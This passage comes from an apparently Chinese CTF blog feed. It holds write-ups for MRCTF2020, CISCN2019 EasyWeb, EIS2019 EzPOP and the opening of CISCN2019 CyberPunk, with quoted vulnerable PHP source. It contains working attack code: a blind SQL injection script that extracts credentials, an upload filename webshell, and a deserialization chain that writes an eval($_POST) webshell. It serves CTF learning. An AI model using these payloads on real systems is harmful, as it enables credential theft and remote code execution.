class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>限制了ip是本地，这个好绕过，直接用Client-ip绕过就行了（chrome的hackbar不知道出什么问题了，client-ip没办法传）接下来就是传入2333了，需要我们传入<code>todat is a happy day</code> 这个可以用data伪协议写入字符串，然后就到了我们的过滤，需要经过一个change打乱，我们可以直接逆写一下算法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">10</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="variable">$f</span> = <span class="string">&#x27;./flag.php&#x27;</span>;</span><br><span class="line">	<span class="comment">#echo ord($f[$i]);</span></span><br><span class="line">	<span class="variable">$a</span> .=chr(ord(<span class="variable">$f</span>[<span class="variable">$i</span>])-<span class="variable">$i</span>*<span class="number">2</span>);	</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>把Merak删除，传入其余两个参数，即可拿到flag</p>
]]></content>
      <tags>
        <tag>MRCTF2020</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN总决赛2019-EasyWeb</title>
    <url>/2022/04/07/CISCN%E6%80%BB%E5%86%B3%E8%B5%9B2019-EasyWeb/</url>
    <content><![CDATA[<h2 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h2><p>打开是一个登录框，啥也没有，登录也没有回显，访问robots.txt得到提示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: *.php.bak</span><br></pre></td></tr></table></figure>

<p>查看源码看到</p>
<p><img src="/2022/04/07/CISCN%E6%80%BB%E5%86%B3%E8%B5%9B2019-EasyWeb/1.png" alt="1"></p>
<p>很可疑，而且在index.php.bak中没有备份文件</p>
<p>转到image.php.bak下载备份看到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]:<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$path</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=addslashes(<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=addslashes(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);<span class="comment">#将id中的这些替换为空</span></span><br><span class="line"><span class="variable">$path</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=mysqli_query(<span class="variable">$con</span>,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="variable">$row</span>=mysqli_fetch_array(<span class="variable">$result</span>,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="variable">$path</span>=<span class="string">&quot;./&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>];</span><br><span class="line">header(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line">readfile(<span class="variable">$path</span>);</span><br></pre></td></tr></table></figure>

<p>审计一下代码：</p>
<p>发现id跟path经过了addslashes函数的过滤：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果没有加第二个参数那么就对预定字符进行过滤：</span><br><span class="line">预定义字符是：</span><br><span class="line">单引号（’）</span><br><span class="line">双引号（”）</span><br><span class="line">反斜杠（\）</span><br><span class="line">NULL</span><br></pre></td></tr></table></figure>

<p>当他过滤之后又对其中的某些参数进行了替换成空的操作</p>
<p>发现漏洞：</p>
<p>虽然我没无法在id或者path处直接构造注入但是他经过addslashes经过过滤之后再替换的时候就有可能会出问题</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">select * from images where id=&#x27;&#123;$id&#125;&#x27; or path=&#x27;&#123;$path&#125;&#x27;//原本参数</span><br><span class="line">当我们的id构造成\\0</span><br><span class="line">经过addslashes过滤之后变成（因为有两个\）：\\\\0</span><br><span class="line">经过替换变成id=\\</span><br><span class="line">原来的语句就变成</span><br><span class="line">select * from images where id=&#x27;\\&#x27; or path=&#x27;&#123;$path&#125;&#x27;</span><br><span class="line">这样的话id后面的单引号就被注释掉了这时候我们就可以再path中随意写入语句然后注释掉后面的单引号</span><br><span class="line">select * from images where id=&#x27;\&#x27; or path=&#x27; or 1 #&#x27;</span><br><span class="line">这样构造之后就可以正确回显了</span><br></pre></td></tr></table></figure>

<p>很明显了就是布尔盲注：</p>
<p>直接附上脚本（注意这里的单引号会被替换成空，所以得换个手法，可以用16进制的写法，当时没注意，卡了一下）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://acca4e86-7d89-4e51-ad58-a5778c457810.node4.buuoj.cn:81/image.php&quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">30</span>):</span><br><span class="line">    right = <span class="number">127</span></span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    mid = <span class="built_in">int</span>((right + left) &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> right &gt; left:</span><br><span class="line">        <span class="comment">#payload = &quot; or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))&gt;%d,1,0)#&quot; % (i, mid)</span></span><br><span class="line">        <span class="comment">#payload = &quot; or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=(0x7573657273)),%d,1))&gt;%d,1,0)#&quot; % (i, mid)</span></span><br><span class="line">        payload = <span class="string">&quot; or if(ascii(substr((select concat(username,0x7e,password) from users),%d,1))&gt;%d,1,0)#&quot;</span> % (i, mid)</span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;\\0&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;path&#x27;</span>: payload</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.get(url, params=params)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;JFIF&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        mid = <span class="built_in">int</span>((right + left) &gt;&gt; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    result += <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="comment">#这里的text是不太好输出的会出问题，这个JFIF可以在页面的源代码里面找到</span></span><br></pre></td></tr></table></figure>

<p>自己写的脚本然后上网偷的二分法脚本改的</p>
<p>最后爆出账号跟密码，登录<code>admin~a58a98a0100eee59d00f</code></p>
<p>看起来是一个文件上传</p>
<p>先随机传一个东西进去</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I logged the file name you uploaded to logs/upload.c929826db8ba7527af6122dddc289905.log.php. LOL&lt;script&gt;setTimeout(&#x27;location.href=&quot;user.php&quot;&#x27;,3000);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>给了我们上传的路径，进去看看</p>
<p><img src="/2022/04/07/CISCN%E6%80%BB%E5%86%B3%E8%B5%9B2019-EasyWeb/2.png" alt="1"></p>
<p>只看到了文件名，并没有文件的内容，那应该与文件内容无关了，而且他直接将文件名拿到了网页中，直接在文件名处构造一句话然后执行，文件名不能包含php就行了直接用<code>&lt;?=</code>绕过就行</p>
<p><img src="/2022/04/07/CISCN%E6%80%BB%E5%86%B3%E8%B5%9B2019-EasyWeb/3.png" alt="1"></p>
<p>拿到flag</p>
]]></content>
      <tags>
        <tag>CISCN2019</tag>
      </tags>
  </entry>
  <entry>
    <title>EIS-EzPOP</title>
    <url>/2022/04/02/EIS-EzPOP/</url>
    <content><![CDATA[<h2 id="EIS-2019-EzPOP"><a href="#EIS-2019-EzPOP" class="headerlink" title="[EIS 2019]EzPOP"></a>[EIS 2019]EzPOP</h2><p>在题目端给出了源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$expire</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$store</span>, <span class="variable">$key</span> = <span class="string">&#x27;flysystem&#x27;</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>) </span>&#123;<span class="comment">#初始化</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = <span class="variable">$key</span>;<span class="comment">#flysystem</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = <span class="variable">$store</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;expire = <span class="variable">$expire</span>;<span class="comment">#null</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$contents</span></span>) </span>&#123;<span class="comment">#返回交集</span></span><br><span class="line">        <span class="variable">$cachedProperties</span> = array_flip([<span class="comment">#array_flip — 交换数组中的键和值</span></span><br><span class="line">            <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;dirname&#x27;</span>, <span class="string">&#x27;bas/ename&#x27;</span>, <span class="string">&#x27;extension&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;mimetype&#x27;</span>, <span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;type&#x27;</span>,</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$contents</span> <span class="keyword">as</span> <span class="variable">$path</span> =&gt; <span class="variable">$object</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array(<span class="variable">$object</span>)) &#123;<span class="comment">#检测他是否是数组</span></span><br><span class="line">                <span class="variable">$contents</span>[<span class="variable">$path</span>] = array_intersect_key(<span class="variable">$object</span>, <span class="variable">$cachedProperties</span>);<span class="comment">#返回两个数组的交集</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>;<span class="comment">#返回</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$cleaned</span> = <span class="keyword">$this</span>-&gt;cleanContents(<span class="keyword">$this</span>-&gt;cache);<span class="comment">#调用需要cache里面跟这里面的键值有交集</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> json_encode([<span class="variable">$cleaned</span>, <span class="keyword">$this</span>-&gt;complete]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>) </span>&#123;<span class="comment">#调用取交集返回#store = new b();</span></span><br><span class="line">        <span class="variable">$contents</span> = <span class="keyword">$this</span>-&gt;getForStorage();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;store-&gt;set(<span class="keyword">$this</span>-&gt;key, <span class="variable">$contents</span>, <span class="keyword">$this</span>-&gt;expire);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;<span class="comment">#析构方法，如果没有保存，调用save方法</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;autosave) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getExpireTime</span>(<span class="params"><span class="variable">$expire</span></span>): <span class="title">int</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>) <span class="variable">$expire</span>;<span class="comment">#强制转换成整型</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . <span class="variable">$name</span>;<span class="comment">#</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span>(<span class="params"><span class="variable">$data</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_numeric(<span class="variable">$data</span>)) &#123;<span class="comment">#检测数据是否为数字返回string</span></span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">string</span>) <span class="variable">$data</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$serialize</span> = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$serialize</span>(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;writeTimes++;</span><br><span class="line">        <span class="variable">$expire</span> = <span class="keyword">$this</span>-&gt;getExpireTime(<span class="variable">$expire</span>);<span class="comment">#将其转换成整数传入expire</span></span><br><span class="line">        <span class="variable">$filename</span> = <span class="keyword">$this</span>-&gt;getCacheKey(<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$dir</span> = dirname(<span class="variable">$filename</span>);<span class="comment">#返回目录中的路径部分</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!is_dir(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                mkdir(<span class="variable">$dir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="comment">// 创建失败</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="keyword">$this</span>-&gt;serialize(<span class="variable">$value</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//数据压缩</span></span><br><span class="line">            <span class="variable">$data</span> = gzcompress(<span class="variable">$data</span>, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$data</span> = <span class="string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="string">&#x27;%012d&#x27;</span>, <span class="variable">$expire</span>) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="variable">$data</span>;<span class="comment">#返回格式化字符串</span></span><br><span class="line">        <span class="variable">$result</span> = file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>);<span class="comment">#应该是最终调用</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一次做到这么长的代码分析，里面藏了很多垃圾代码，先一步步来看。先找找我们最终需要利用的函数，在Bclass中找到了file_put_contents函数，应该就是需要我们写入一句话来geishell，写入的代码放在了data变量里面，前面添加了死亡杂糅exit，但是网上看的时候expire是我们可以自己控制的，而且可以在下面的filename读取写入文件的时候进行base64解码，这样他data里面的不可识别的符号就会被替换成空格，也就是说这里的<code>&lt;?();?&gt;\n</code>全部都会被换空，这样就只剩下phpexit但是他只有7个字符，我们可直接置0然后在我们写入data的时候直接将我们的数组写入，在他被base64解析的时候在数组的key值可以改变被base64解码的值，（base64只可以解4个字符为一组的整组编码）我们可以填充垃圾数，来填补空缺，将剩余的凑成一组，继续网上跟进现在主要的就是如何进入set函数，跟进到class A发现在save函数中会调用到set函数=&gt;析构方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">整理一下思路，</span><br><span class="line">由A的析构方法，用set访问store</span><br><span class="line">即用B实例store</span><br><span class="line">然后调用set</span><br><span class="line"></span><br><span class="line">如何可以看到Key在进入set的时候变成了name，那么这里就是我们写入文件名的地方</span><br><span class="line">cleanContents这个函数中最后返回的是两个键值比较的交集，因为他会使用foreach进行分割，所以可以嵌套数组，让第一个数组的value为另一数组，二这个数组的key值需要取上面的一组键值中的任意一个（我用的path），然后后面进入set时value就会以&#x27;垃圾值=&gt;&#123;path=&gt;一句话木马&#125;&#x27;的形式经过json编码的形式进入（complete也可控）最终进入到data中最后在我们设置的filename处被解码而这里的垃圾值是我们之前设置cache数组的时候自己设定的，是可控的，至于那些数据压缩什么的，我们直接置空那些数据，就可以不进入也就相当于垃圾代码value还需要经过serialize函数才能赋值给data，但是这里的序列化函数也是假的，她会对我们的数字进行强制转换然后执行，设定的serialize代码，这视自己设定的，因为我们不需要执行什么操作，所以我们可以直接就绕过它用（strval取回字符串）</span><br><span class="line">name进入set之后会与设定的目录进行拼接，这里是可控的，那么就可以用为协议来设定上传目录以及将内容解码</span><br></pre></td></tr></table></figure>

<p>最终payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$key</span> = <span class="string">&#x27;1hack.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$expire</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$autosave</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$cache</span> = <span class="keyword">array</span>(<span class="number">111</span>=&gt;<span class="keyword">array</span>(<span class="string">&#x27;path&#x27;</span>=&gt;<span class="string">&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pmtra2tr&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$complete</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$store</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;store = <span class="variable">$store</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$options</span> = <span class="keyword">array</span>(<span class="string">&#x27;expire&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;prefix&#x27;</span>=&gt;<span class="string">&quot;php://filter/write=convert.base64-decode/resource=./uploads/&quot;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;serialize&#x27;</span>=&gt;<span class="string">&#x27;strval&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> B;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>为什么要设定111为垃圾数？</p>
<p>虽然可以自己测，但是还是说一下原理：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这里就是我们设定的data=&lt;?php//\n000000000000\nexit();?&gt;[&#123;&quot;111&quot;:&#123;&quot;path&quot;:&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs\/Pmtra2tr&quot;&#125;&#125;,1]</span><br><span class="line">当它经过base64decode的时候其中的数就相当于经过了一层替换，因为它不会匹配那些符号将那些符号替换掉</span><br><span class="line">那么经过我们的data就会被解析成：</span><br><span class="line">phpn000000000000nexit111pathPD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsPmtra2tr1</span><br><span class="line">而他的长度正好是72可以被base64正确解析，因为他的总长度为69所以凑三个1让其能被分组解析</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>EIS2019</tag>
      </tags>
  </entry>
  <entry>
    <title>CyberPunk</title>
    <url>/2022/04/06/CyberPunk/</url>
    <content><![CDATA[<h2 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h2><p>突然刷到这题，来看看</p>
<p>进入题目是一个购买赛博朋克的信息</p>
<p>具体也不知道有什么用，先收集一下资料</p>
<p>看了下页面源代码发现：<code>&lt;!--?file=?--&gt;</code></p>
<p>猜测可以读取页面源码：</p>
<p>已知的页面：<code>index.php   delete.php    search.php  change.php confirm.php</code></p>
<p>读取他的源码看看：</p>
<p><code>index.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $file = $_GET[&quot;file&quot;];</span></span><br><span class="line"><span class="variable">$file</span> = (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] : <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;</span>,<span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;no way!&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!--?file=?--&gt;</span><br></pre></td></tr></table></figure>

<p><code>delete.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || preg_match(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123; </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;fetch_assoc();</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;query(<span class="string">&#x27;delete from `user` where `user_id`=&#x27;</span> . <span class="variable">$row</span>[<span class="string">&quot;user_id&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;订单删除成功&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>search.php</code></p>
